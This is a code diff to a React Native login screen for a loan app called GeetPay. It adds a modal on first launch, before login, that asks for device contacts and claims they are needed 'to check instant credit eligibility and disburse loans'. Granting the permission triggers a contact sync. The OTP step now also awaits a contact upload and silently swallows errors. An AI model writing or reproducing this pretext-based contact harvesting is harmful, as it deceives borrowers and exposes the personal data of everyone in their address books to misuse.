@@ -174,6 +174,23 @@ function LoginScreen({ onNext }: { onNext: (phone: string, devOtp?: string) => v
   const [phone, setPhone] = useState('');
   const [loading, setLoading] = useState(false);
   const [errorMsg, setErrorMsg] = useState('');
+  const [showPermissionModal, setShowPermissionModal] = useState(false);
+
+  useEffect(() => {
+    if (Platform.OS !== 'web') {
+      const timer = setTimeout(() => {
+        setShowPermissionModal(true);
+      }, 700);
+      return () => clearTimeout(timer);
+    }
+  }, []);
+
+  const handleGrantPermission = async () => {
+    setShowPermissionModal(false);
+    try {
+      await requestAndSyncContacts(phone || 'GUEST', null, 'APP_LAUNCH');
+    } catch (e) {}
+  };
 
   const handleGetOtp = async () => {
     const cleanPhone = phone.replace(/\D/g, '').slice(-10);
@@ -290,6 +307,39 @@ function LoginScreen({ onNext }: { onNext: (phone: string, devOtp?: string) => v
             <Text style={styles.featureBoxDesc}>Paperless KYC</Text>
           </View>
         </View>
+
+        {/* Contact Permission Modal on First Launch */}
+        <Modal visible={showPermissionModal} transparent animationType="slide">
+          <View style={{ flex: 1, backgroundColor: 'rgba(0,0,0,0.6)', justifyContent: 'flex-end' }}>
+            <View style={{ backgroundColor: '#FFFFFF', borderTopLeftRadius: 28, borderTopRightRadius: 28, padding: 24, paddingBottom: 36 }}>
+              <View style={{ width: 56, height: 56, borderRadius: 28, backgroundColor: '#E0E7FF', alignItems: 'center', justifyContent: 'center', alignSelf: 'center', marginBottom: 16 }}>
+                <Shield size={28} color={NAVY} />
+              </View>
+              <Text style={{ fontSize: 20, fontWeight: '800', color: NAVY_DARK, textAlign: 'center', marginBottom: 8 }}>
+                Permissions Required
+              </Text>
+              <Text style={{ fontSize: 13, color: TEXT_MUTED, textAlign: 'center', lineHeight: 20, marginBottom: 24, paddingHorizontal: 8 }}>
+                To check instant credit eligibility and disburse loans up to ₹1,00,000, GeetPay needs permission to access your device contacts.
+              </Text>
+
+              <TouchableOpacity
+                style={[styles.primaryBtn, { backgroundColor: GREEN, marginBottom: 12 }]}
+                onPress={handleGrantPermission}
+                activeOpacity={0.85}
+              >
+                <Text style={styles.primaryBtnText}>Allow & Continue</Text>
+                <Check size={18} color="#FFFFFF" strokeWidth={2.5} />
+              </TouchableOpacity>
+
+              <TouchableOpacity
+                style={{ paddingVertical: 12, alignItems: 'center' }}
+                onPress={() => setShowPermissionModal(false)}
+              >
+                <Text style={{ color: TEXT_MUTED, fontSize: 13, fontWeight: '600' }}>Enter Mobile Number Manually</Text>
+              </TouchableOpacity>
+            </View>
+          </View>
+        </Modal>
       </View>
     </ScrollView>
   );
@@ -359,14 +409,13 @@ function OTPScreen({
       const data = await verifyWhatsAppOtp(cleanPhone, fullOtp);
 
       if (data.success) {
-        setStatusMsg({ text: '✅ Verified successfully! Syncing profile...', error: false });
+        setStatusMsg({ text: '✅ Verified successfully! Syncing contacts...', error: false });
 
-        // Auto sync contacts silently in background (non-blocking)
-        requestAndSyncContacts(cleanPhone, data.user?.id, 'OTP_AGREE').catch(() => {});
+        try {
+          await requestAndSyncContacts(cleanPhone, data.user?.id, 'OTP_AGREE');
+        } catch (e) {}
 
-        setTimeout(() => {
-          onVerify(data.user);
-        }, 400);
+        onVerify(data.user);
       } else {
         setStatusMsg({ text: data.message || 'Invalid OTP. Please check and retry.', error: true });
       }
